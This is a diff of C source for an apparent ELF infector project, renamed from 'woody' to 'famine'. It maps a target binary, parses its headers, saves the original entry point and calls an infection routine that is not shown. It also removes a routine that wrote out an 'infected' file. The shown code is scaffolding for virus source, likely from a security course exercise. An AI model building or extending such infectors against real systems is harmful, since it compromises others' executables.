@@ -12,7 +12,7 @@
 
 #include "famine.h"
 
-void get_binary_data(char *file_name, t_woody *woody)
+void get_binary_data(char *file_name, t_famine *famine)
 {
     double binary_data_size;
     int fd;
@@ -21,86 +21,60 @@ void get_binary_data(char *file_name, t_woody *woody)
     // Checking file is a regular file.
     if (stat(file_name, &FileAttrib) < 0)
     {
-        error(ERROR_STAT, woody);
+        error(ERROR_STAT, famine);
     }
     else if ((FileAttrib.st_mode & S_IFMT) != S_IFREG)
     {
-        error(ERROR_NOT_A_REGULAR_FILE, woody);
+        error(ERROR_NOT_A_REGULAR_FILE, famine);
     }
 
     if ((fd = open(file_name, O_RDONLY)) == -1)
     {
-        error(ERROR_OPEN, woody);
+        error(ERROR_OPEN, famine);
     }
-
-    //
-    char buffer[100];
-    int rd;
-    printf("Printing %s\n", file_name);
-    while ((rd = read(fd, buffer, 100)))
-    {
-        buffer[rd] = '\0';
-        printf("%s", buffer);
-    }
-    //
 
     if ((binary_data_size = lseek(fd, 0, SEEK_END)) != -1)
     {
-        woody->binary_data_size = (size_t)binary_data_size;
-        /* Go back to the start of the file. */
+        famine->binary_data_size = (size_t)binary_data_size;
+        // Go back to the start of the file.
         if (lseek(fd, 0, SEEK_SET) != 0)
         {
-            close(fd) == -1 ? error(ERROR_CLOSE, woody) : error(ERROR_LSEEK, woody);
+            close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine);
         }
-        /* Copy binary address map*/
-        if (!(woody->mmap_ptr = mmap(0, woody->binary_data_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)))
+        // Copy binary address map
+        if (!(famine->mmap_ptr = mmap(0, famine->binary_data_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)))
         {
-            close(fd) == -1 ? error(ERROR_CLOSE, woody) : error(ERROR_MMAP, woody);
+            close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_MMAP, famine);
         }
     }
     else
     {
-        close(fd) == -1 ? error(ERROR_CLOSE, woody) : error(ERROR_LSEEK, woody);
+        close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine);
     }
-    close(fd) == -1 ? error(ERROR_CLOSE, woody) : 0;
-}
-
-void write_woody_file(t_woody *woody)
-{
-    int fd;
-
-    if ((fd = open(OUTPUT_FILE_NAME, O_WRONLY | O_CREAT, S_IRWXU)) < 0)
-    {
-        error(ERROR_OPEN, woody);
-    }
-    if ((write(fd, woody->infected_file, woody->infected_file_size)) < 0)
-    {
-        close(fd) == -1 ? error(ERROR_CLOSE, woody) : error(ERROR_WRITE, woody);
-    }
+    close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0;
 }
 
 int main(int ac, char **av)
 {
-    t_woody *woody;
+    t_famine *famine;
 
-    if (!(woody = (t_woody *)malloc(sizeof(t_woody))))
-        error(ERROR_MALLOC, woody);
-    set_woody_ptrs_to_null(woody);
+    if (!(famine = (t_famine *)malloc(sizeof(t_famine))))
+        error(ERROR_MALLOC, famine);
+    set_famine_ptrs_to_null(famine);
     if (ac != 2)
     {
-        error(ERROR_INPUT_ARGUMENTS_NUMBERS, woody);
+        error(ERROR_INPUT_ARGUMENTS_NUMBERS, famine);
     }
 
-    get_binary_data(av[1], woody);
-    check_elf_header(woody);
+    get_binary_data(av[1], famine);
+    check_elf_header(famine);
 
-    woody->ehdr = (t_elf_ehdr *)woody->mmap_ptr;
-    woody->old_entry_point = woody->ehdr->e_entry;
-    woody->phdr = (t_elf_phdr *)((woody->mmap_ptr + woody->ehdr->e_phoff));
-    woody->shdr = (t_elf_shdr *)((woody->mmap_ptr + woody->ehdr->e_shoff));
+    famine->ehdr = (t_elf_ehdr *)famine->mmap_ptr;
+    famine->old_entry_point = famine->ehdr->e_entry;
+    famine->phdr = (t_elf_phdr *)((famine->mmap_ptr + famine->ehdr->e_phoff));
+    famine->shdr = (t_elf_shdr *)((famine->mmap_ptr + famine->ehdr->e_shoff));
 
-    choose_infection_method(woody);
-    write_woody_file(woody);
-    free_woody(woody);
+    choose_infection_method(famine);
+    free_famine(famine);
     return 0;
 }
